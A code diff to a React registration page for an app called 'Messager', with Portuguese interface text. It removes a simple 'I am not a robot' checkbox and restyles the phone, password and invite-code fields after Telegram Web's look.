@@ -5,7 +5,7 @@ import { useToast } from '../components/Toast';
 import { supabase } from '../lib/supabase';
 import { getDeviceId } from '../lib/device';
 import { subscribeToPushNotifications } from '../lib/pushNotifications';
-import { Loader2, Search, X, Check, Copy, CheckCircle, Eye, EyeOff, ChevronDown } from 'lucide-react';
+import { Loader2, Search, X, Check, Copy, Eye, EyeOff, ChevronDown } from 'lucide-react';
 import { COUNTRIES, Country } from '../lib/countries';
 
 export default function Messager() {
@@ -20,8 +20,7 @@ export default function Messager() {
   const [userPasskey, setUserPasskey] = useState('');
   const [showUserPasskey, setShowUserPasskey] = useState(false);
 
-  // Captcha "Não sou um robô"
-  const [isRobotVerified, setIsRobotVerified] = useState(false);
+
 
   // Passkey reveal dialog
   const [showPasskeyDialog, setShowPasskeyDialog] = useState(false);
@@ -78,10 +77,6 @@ export default function Messager() {
       return;
     }
 
-    if (!isRobotVerified) {
-      showToast('Por favor, confirme a verificação "Não sou um robô".', 'error');
-      return;
-    }
 
     setIsSubmitting(true);
     try {
@@ -203,95 +198,88 @@ export default function Messager() {
         {/* ── FORMULÁRIO DE CADASTRO ── */}
         <form onSubmit={executeRegistration} className="w-full flex flex-col gap-4">
 
-          {/* Campos com arredondamento de 22px */}
-          <div className="w-full flex flex-col gap-3">
-            {/* 1. Telefone com seletor de país */}
-            <div
-              className="input-auth-wrap"
-              style={{ border: '1px solid #e5e5e5', background: '#f8f8f8', height: '52px', display: 'flex', alignItems: 'center', paddingLeft: '12px', paddingRight: '12px' }}
-            >
+          {/* Campos com arredondamento exato do Telegram Web */}
+          <div className="w-full flex flex-col gap-5 mt-2">
+            
+            {/* 1. Country Select */}
+            <div className="relative w-full">
+              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
+                <label className="text-[14px] text-[#707579] font-medium leading-none">Country</label>
+              </div>
               <button
                 type="button"
                 onClick={() => setShowCountryModal(true)}
-                className="flex items-center gap-1 text-[15px] font-medium text-black border-r border-[#e5e5e5] pr-2.5 mr-3 shrink-0 cursor-pointer hover:opacity-70"
+                className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center justify-between px-3.5 hover:border-[#3390ec] focus:border-[#3390ec] focus:outline-none transition-colors cursor-pointer"
                 title="Mudar país"
               >
-                <span>{selectedCountry.dial_code}</span>
-                <ChevronDown className="w-3.5 h-3.5 text-[#8e8e93] stroke-[2.2]" />
-              </button>
-              <input
-                name="phone"
-                type="tel"
-                inputMode="numeric"
-                autoComplete="tel"
-                placeholder="Por favor, insira o número de telefone."
-                className="input-auth flex-1 bg-transparent outline-none text-[15px] text-black placeholder:text-[#c7c7cc] font-normal"
-                value={formData.phone}
-                onChange={handleChange}
-                maxLength={selectedCountry.maxLength}
-              />
-            </div>
-
-            {/* 2. Senha */}
-            <div
-              className="input-auth-wrap"
-              style={{ border: '1px solid #e5e5e5', background: '#f8f8f8', height: '52px', display: 'flex', alignItems: 'center', paddingLeft: '12px', paddingRight: '12px' }}
-            >
-              <input
-                name="userPasskey"
-                type={showUserPasskey ? 'text' : 'password'}
-                placeholder="Por favor, insira a sua senha."
-                className="input-auth flex-1 bg-transparent outline-none text-[15px] text-black placeholder:text-[#c7c7cc] font-normal"
-                value={userPasskey}
-                onChange={(e) => setUserPasskey(e.target.value)}
-                autoComplete="new-password"
-              />
-              <button
-                type="button"
-                onClick={() => setShowUserPasskey(v => !v)}
-                className="ml-2 text-[#c7c7cc] hover:text-[#3390ec] active:opacity-50 transition-colors p-1 cursor-pointer shrink-0"
-                aria-label={showUserPasskey ? 'Ocultar senha' : 'Ver senha'}
-              >
-                {showUserPasskey ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                <span className="text-[16px] text-black font-normal">{selectedCountry.name}</span>
+                <ChevronDown className="w-5 h-5 text-[#a2a6aa]" strokeWidth={2} />
               </button>
             </div>
 
-            {/* 3. Código de convite */}
-            <div
-              className="input-auth-wrap"
-              style={{ border: '1px solid #e5e5e5', background: '#f8f8f8', height: '52px', display: 'flex', alignItems: 'center', paddingLeft: '12px', paddingRight: '12px' }}
-            >
-              <input
-                name="inviteCode"
-                type="text"
-                placeholder="Por favor, insira o código de convite."
-                className="input-auth flex-1 bg-transparent outline-none text-[15px] text-black placeholder:text-[#c7c7cc] font-normal"
-                value={formData.inviteCode}
-                onChange={handleChange}
-                maxLength={10}
-              />
-            </div>
-
-            {/* 4. Verificação "Não sou um robô" */}
-            <div
-              onClick={() => setIsRobotVerified(prev => !prev)}
-              className="input-auth-wrap"
-              style={{ border: '1px solid #e5e5e5', background: '#f8f8f8', height: '52px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', paddingLeft: '12px', paddingRight: '12px', userSelect: 'none', cursor: 'pointer' }}
-            >
-              <div className="flex items-center gap-2.5">
+            {/* 2. Phone Number */}
+            <div className="relative w-full">
+              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
+                <label className="text-[14px] text-[#707579] font-medium leading-none">Your phone number</label>
+              </div>
+              <div className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
+                <span className="text-[16px] text-black mr-1.5">{selectedCountry.dial_code}</span>
                 <input
-                  type="checkbox"
-                  checked={isRobotVerified}
-                  onChange={() => {}}
-                  className="w-4 h-4 rounded text-[#3390ec] accent-[#3390ec] cursor-pointer"
+                  name="phone"
+                  type="tel"
+                  inputMode="numeric"
+                  autoComplete="tel"
+                  className="flex-1 bg-transparent outline-none text-[16px] text-black font-normal h-full w-full"
+                  value={formData.phone}
+                  onChange={handleChange}
+                  maxLength={selectedCountry.maxLength}
                 />
-                <span className="text-[14px] text-black font-normal">Não sou um robô</span>
-              </div>
-              <div className="flex items-center gap-1 text-[12px] font-medium text-emerald-600">
-                <CheckCircle className="w-3.5 h-3.5 text-emerald-500" />
-                <span>Verificação</span>
               </div>
             </div>
+
+            {/* 3. Senha */}
+            <div className="relative w-full">
+              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
+                <label className="text-[14px] text-[#707579] font-medium leading-none">Password</label>
+              </div>
+              <div className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
+                <input
+                  name="userPasskey"
+                  type={showUserPasskey ? 'text' : 'password'}
+                  className="flex-1 bg-transparent outline-none text-[16px] text-black font-normal h-full w-full"
+                  value={userPasskey}
+                  onChange={(e) => setUserPasskey(e.target.value)}
+                  autoComplete="new-password"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowUserPasskey(v => !v)}
+                  className="ml-2 text-[#a2a6aa] hover:text-[#3390ec] transition-colors shrink-0"
+                  aria-label={showUserPasskey ? 'Ocultar senha' : 'Ver senha'}
+                >
+                  {showUserPasskey ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                </button>
+              </div>
+            </div>
+
+            {/* 4. Código de convite */}
+            <div className="relative w-full">
+              <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
+                <label className="text-[14px] text-[#707579] font-medium leading-none">Invite Code</label>
+              </div>
+              <div className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
+                <input
+                  name="inviteCode"
+                  type="text"
+                  className="flex-1 bg-transparent outline-none text-[16px] text-black font-normal h-full w-full"
+                  value={formData.inviteCode}
+                  onChange={handleChange}
+                  maxLength={10}
+                />
+              </div>
+            </div>
+
+
           </div>
 
           {/* 5. BOTÕES DE AÇÃO */}
@@ -299,7 +287,7 @@ export default function Messager() {
             <button
               type="submit"
               disabled={isSubmitting}
-              className="btn-auth w-full h-[48px] bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer"
+              className="w-full h-[48px] rounded-xl bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer"
             >
               {isSubmitting ? <Loader2 className="animate-spin h-5 w-5 text-white" /> : 'Inscrever-se'}
             </button>
@@ -307,7 +295,7 @@ export default function Messager() {
             <button
               type="button"
               onClick={() => navigate('/login')}
-              className="btn-auth w-full text-center text-[#3390ec] hover:text-[#2881dc] font-medium text-[14.5px] transition-colors py-2 cursor-pointer hover:underline"
+              className="w-full text-center text-[#3390ec] hover:text-[#2881dc] font-medium text-[14.5px] transition-colors py-2 cursor-pointer hover:underline"
             >
               Já tenho conta — Conectar-se
             </button>
